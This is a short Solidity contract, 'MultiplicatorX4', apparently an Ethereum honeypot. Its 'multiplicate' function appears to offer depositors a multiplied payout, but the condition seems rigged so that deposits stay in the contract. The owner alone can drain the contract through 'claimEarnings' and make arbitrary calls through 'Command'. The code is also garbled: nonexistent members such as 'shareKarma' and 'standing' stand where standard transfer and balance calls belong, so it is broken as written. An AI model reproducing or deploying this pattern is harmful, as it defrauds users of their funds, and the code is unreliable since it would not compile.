pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public GroupOwner = msg.sender;

    function() public payable{}

    function claimEarnings()
    payable
    public
    {
        require(msg.sender == GroupOwner);
        GroupOwner.shareKarma(this.standing);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == GroupOwner);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.standing)
        {
            adr.shareKarma(this.standing+msg.value);
        }
    }
}